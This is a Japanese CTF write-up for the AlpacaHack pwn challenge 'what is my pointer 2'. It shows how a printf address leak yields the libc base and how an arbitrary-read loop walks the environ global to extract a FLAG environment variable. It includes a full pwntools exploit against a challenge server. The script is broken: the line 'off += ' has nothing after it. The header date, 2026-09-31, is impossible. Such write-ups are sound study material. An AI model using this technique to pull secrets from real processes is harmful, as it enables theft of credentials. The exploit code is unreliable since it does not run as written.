---
title: Daily-AlpacaHack 「what is my pointer 2」Hard Writeup
description: printf() のアドレスリークによるlibc baseの算出，任意アドレス読み込みを利用したenvironグローバル変数のアクセス
date: 2026-09-31 00:10:00 +0900
categories: [CyberSecurity, CTF]
tags: [alpacahack, pwn, environ_technique]
math: true
---

# daily_alpaca-pwn-hard-what_is_my_pointer_2

## Summary

本門は，`printf()` のアドレスリークによる **libc base** の算出，連続的な任意アドレス読み込みを利用した `environ` グローバル変数のアクセスに関する問題です．

> - **Category**: Pwn
> - **Description**: "The Usefulness of Useless Knowledge" (Abraham Flexner, 1939)
> - **Tools & TechStack**:
> 	- C
> - **Release**: 2026/09/27
{: .prompt-info }

**階層構造**
```
.
├── chal
├── chal.c
├── compose.yml
├── Dockerfile
└── flag.txt

1 directory, 5 files
```

**バイナリ保護機構**
```shell
$ checksec --file=chal    
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

---
## ソースコードの解析

`printf()` のアドレスリークが存在します．
加えて，`while(1)` なため連続して任意アドレス読み取りが可能な実装になっています．

libc 内の関数は互いのオフセットが固定であり，`printf` の実アドレスが既知なため **libc base** が計算できます．(**Libc ASLR の無効化**)

```c
// gcc chal.c -o chal
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define __FILE__ "chal.c"

int main(void) {
    printf("printf @ %p\n",printf); // printf のアドレスリーク
    while(1) {
        printf("input the pointer where you wanna read:");
        unsigned long ptr;
        scanf("%lx%*c",&ptr);
        printf("%lx\n",*(unsigned long *)ptr);
    }
}

__attribute__((constructor))
void setup() {
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
}
```

`/bin/cat flag` 的な構成ではないため，この機能を利用してシェルを奪取することが目的かと考えましたが，`Dockerfile` を読むとヒントがありました．

## **libc base** から `environ` グローバル変数を読む

`Dockerfile`
```dockerfile
#...
RUN cat > /etc/xinetd.d/pwn << EOF && rm /tmp/flag.txt && chmod 400 /etc/xinetd.d/pwn
service pwn
{
  type           = UNLISTED
  disable        = no
  socket_type    = stream
  protocol       = tcp
  wait           = no
  user           = pwn
  bind           = 0.0.0.0
  port           = 1337
  env            = FLAG=$(cat /tmp/flag.txt)
  server         = /usr/bin/timeout
  server_args    = 180 /home/pwn/chal
}
#...
```

`env = FLAG=$(cat /tmp/flag.txt)` で，`FLAG` プロセス環境変数として `cat /tmp/flag.txt` の値を保持しています．

**libc base** が既知であるならば，**libc** でプロセスの環境変数を保持する `environ` グローバル変数を読み取ることができます．[^1]

Cでは，`extern char **environ;` のように定義されているため，以下の手順で中身にアクセスできるはずです．

1. `environ` グローバル変数の値を読む (中身はスタック上の環境変数ポインタ配列 `envp[]` の先頭アドレス)
2. `envp[]` の先頭アドレスからオフセットをずらしながら，そのアドレスの中身を読んでいく．
3. `FLAG=...` の環境変数が見つかれば，その配列要素の値のアドレスを取得する．
4. そのアドレスの値を読むと，それが `/tmp/flag.txt` の中身と同じ．

## Exploit を書く

対象サーバで実行されているイメージから，`libc.so.6` を抽出しておきます．

```shell
$ docker create --name tmp ubuntu:24.04@sha256:186072bba1b2f436cbb91ef2567abca677337cfc786c86e107d25b7072feef0c

$ docker cp tmp:/usr/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6

$ docker rm tmp
```

```python
from pwn import *
import re

context.log_level = 'debug'
libc = ELF('./libc.so.6')
p = remote("34.170.146.252", 31402)

# アドレスから値を読む関数
def read(addr):
    p.recvuntil(b"input the pointer where you wanna read:")
    p.sendline(hex(addr).encode())
    line = p.recvline()
    return int(line.strip(), 16)

# printf のアドレス
line = p.recvline(timeout=1)
match = re.search(rb"0x[0-9a-fA-F]+", line)
assert match, "printf leak not found"
printf_addr = int(match.group(), 16)

# printf のアドレスから，base addr を計算
libc.address = printf_addr - libc.sym['printf']

# libc 内の environ グローバル変数
environ_sym_addr = libc.sym['environ']

# environ 変数の値を読む (スタック上の環境変数ポインタ配列 envp[] の先頭アドレス)
envp = read(environ_sym_addr)

log.success(f"[+] printf : {hex(printf_addr)}")
log.success(f"[+] libc base : {hex(libc.address)}")
log.success(f"[+] environ : {hex(environ_sym_addr)}")
log.success(f"[+] envp : {hex(envp)}")

# envp 配列を前方からインデックスをずらして走査し，各要素の指す文字列先頭が FLAG= かを判定
TARGET = u64(b'FLAG=\x00\x00\x00') & 0xffffffffff
flag_ptr = None
for i in range(64):
    ptr = read(envp + 8*i)
    if ptr == 0: # envp[] は NULL終端なので 0 が出れば終了
        break
    # FLAG= で始まる場合
    if (read(ptr) & 0xffffffffff) == TARGET:
        flag_ptr = ptr
        break
assert flag_ptr, "FLAG not found"

# flag_ptr から 8バイト単位で読み進め，NULL に当たるまで連結して flag 文字列を復元
flag = b''
off = 0
while True:
    chunk = p64(read(flag_ptr + off))
    flag += chunk
    if b'\x00' in chunk:
        break
    off += 

log.success(flag.split(b'\x00')[0].decode())
```

```shell
$ python3 exploit.py
[+] Opening connection to <IP> on port <PORT>: Done
[DEBUG] Received 0x18 bytes:
    b'printf @ 0x7fca0c36e100\n'
#...
[+] [+] printf : 0x7fca0c36e100
[+] [+] libc base : 0x7fca0c30e000
[+] [+] environ : 0x7fca0c518d58
[+] [+] envp : 0x7fff48253328
#...
[DEBUG] Received 0x11 bytes:
    b'4552007d6e6e6e6e\n'
[+] FLAG=Alpaca{REDACTED}
[*] Closed connection to <IP> port <PORT>
```

---
## Post-Mortem & Dead ends

`environ` グローバル変数を利用した問題は初めて解いた
やったことのない攻略方法で勉強になりました :)

AlpacaHackは `Dockerfile` にヒントがあることが多い気がする...

## References

[^1]: [man environ (7): ユーザ環境](https://ja.manpages.org/environ/7)
